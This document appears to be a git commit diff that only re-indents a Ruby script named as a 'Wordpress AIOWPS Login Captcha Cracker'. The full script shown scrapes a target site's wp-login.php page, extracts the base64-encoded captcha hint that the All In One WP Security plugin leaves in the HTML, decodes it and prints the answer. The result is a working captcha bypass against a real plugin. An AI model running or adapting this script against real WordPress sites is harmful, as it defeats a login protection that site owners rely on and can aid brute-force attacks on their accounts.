b442f7cc4db89667b609ad90b489cc2a96d5c2e9
Kent Gruber <kgruber1@emich.edu>
2016-11-01 01:26:05 -0400

    Fixed whitespace

--- aiowps-captcha-cracker.rb
+++ aiowps-captcha-cracker.rb
@@ -12,84 +12,84 @@ require 'base64'
 
 # Formatting a colors are nice and easy. 
 class String
-	def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
-	def green; colorize(self, "\e[1m\e[32m"); end	
-	def red; colorize(self, "\e[1m\e[31m"); end
-	def bold; colorize(self, "\e[1m"); end
+  def colorize(text, color_code)  "#{color_code}#{text}\e[0m" end
+  def green; colorize(self, "\e[1m\e[32m"); end	
+  def red; colorize(self, "\e[1m\e[31m"); end
+  def bold; colorize(self, "\e[1m"); end
 end
 
 def help_menu 
-	puts "Wordpress AIOWPS Login Captcha Cracker".bold
-	puts "-h \tHELP MENU"
-	puts "\tDisplay this very menu.\n"
-	puts "Useage:".bold
-	puts "ruby #{__FILE__} http://www.target-url.com/wp-login.php"
+  puts "Wordpress AIOWPS Login Captcha Cracker".bold
+  puts "-h \tHELP MENU"
+  puts "\tDisplay this very menu.\n"
+  puts "Useage:".bold
+  puts "ruby #{__FILE__} http://www.target-url.com/wp-login.php"
 end
 
 # Handle user input with two simple arguments. 
 # Check if empty.
 if ARGV.empty?
-	puts "[ Failed! ]".red + " No url or arguments passed."
-	puts "-h for help"
-	exit
-# Check if user wants help menu.
+  puts "[ Failed! ]".red + " No url or arguments passed."
+  puts "-h for help"
+  exit
+  # Check if user wants help menu.
 elsif ( ARGV[0].include? "-h" || "-H" )
-	help_menu
-	exit
-# Handle input as usual. 
+  help_menu
+  exit
+  # Handle input as usual. 
 else 
-	# store input as url
-	url = ARGV[0].dup
+  # store input as url
+  url = ARGV[0].dup
 
-	# if the url dosen't include this, we'll add it
-	unless ( ARGV[0].include? "http://www." || "https://www." )
-		url.prepend("http://www.")		
-	end
+  # if the url dosen't include this, we'll add it
+  unless ( ARGV[0].include? "http://www." || "https://www." )
+    url.prepend("http://www.")		
+  end
 
-	# if the url dosen't include the wordpress login bit, we'll add it
-	unless ( ARGV[0].include? "/wp-login.php")
-		url << "/wp-login.php"
-	end
+  # if the url dosen't include the wordpress login bit, we'll add it
+  unless ( ARGV[0].include? "/wp-login.php")
+    url << "/wp-login.php"
+  end
 end
 
 begin 
-# start working the the data, parse the html
-data = Nokogiri::HTML(open(url)) 
+  # start working the the data, parse the html
+  data = Nokogiri::HTML(open(url)) 
 
-# grab the stuff we need 
-encoded_data = data.xpath('//*[@id="aiowps-captcha-string-info"]')
+  # grab the stuff we need 
+  encoded_data = data.xpath('//*[@id="aiowps-captcha-string-info"]')
 
-# split the html elements up 
-relevant = encoded_data.to_s.split
+  # split the html elements up 
+  relevant = encoded_data.to_s.split
 
-# 4th one is the one that contains the encoded string
-encoded_answer = relevant[4].gsub( /value="/,"" ).gsub( /=">/,"" ) 
+  # 4th one is the one that contains the encoded string
+  encoded_answer = relevant[4].gsub( /value="/,"" ).gsub( /=">/,"" ) 
 
-# decode encoded_answer
-decoded_answer = Base64.decode64(encoded_answer)
+  # decode encoded_answer
+  decoded_answer = Base64.decode64(encoded_answer)
 
-# grab the captcha answer as string first
-captcha_answer = decoded_answer.split(//).last(2).join.to_s
+  # grab the captcha answer as string first
+  captcha_answer = decoded_answer.split(//).last(2).join.to_s
 
-# if valid number for captcha answer, checked via regex 
-def valid_number?(num)
-  /^\d{2}$/ === num
-end
+  # if valid number for captcha answer, checked via regex 
+  def valid_number?(num)
+    /^\d{2}$/ === num
+  end
 
-# check if the first captcha_answer grabbed is a valid number or not
-unless valid_number?(captcha_answer)
-	# if not valid number, only grab last char which will be a number always 
-	captcha_answer = decoded_answer.split(//).last(1).join.to_i
-else
-	# if valid, grab last two
-	captcha_answer = decoded_answer.split(//).last(2).join.to_i
-end
+  # check if the first captcha_answer grabbed is a valid number or not
+  unless valid_number?(captcha_answer)
+    # if not valid number, only grab last char which will be a number always 
+    captcha_answer = decoded_answer.split(//).last(1).join.to_i
+  else
+    # if valid, grab last two
+    captcha_answer = decoded_answer.split(//).last(2).join.to_i
+  end
 
-# print stuff to screen
-puts "Wordpress AIOWPS Login Captcha Cracker".bold
-puts "Encoded Answer: #{encoded_answer}"
-puts "Decoded Answer: #{decoded_answer}"
-puts "Captcha Answer:" + " #{captcha_answer}".green
+  # print stuff to screen
+  puts "Wordpress AIOWPS Login Captcha Cracker".bold
+  puts "Encoded Answer: #{encoded_answer}"
+  puts "Decoded Answer: #{decoded_answer}"
+  puts "Captcha Answer:" + " #{captcha_answer}".green
 rescue 
-	puts "[ Failed! ]".red + " Something went wrong while trying to reach #{url}"
+  puts "[ Failed! ]".red + " Something went wrong while trying to reach #{url}"
 end
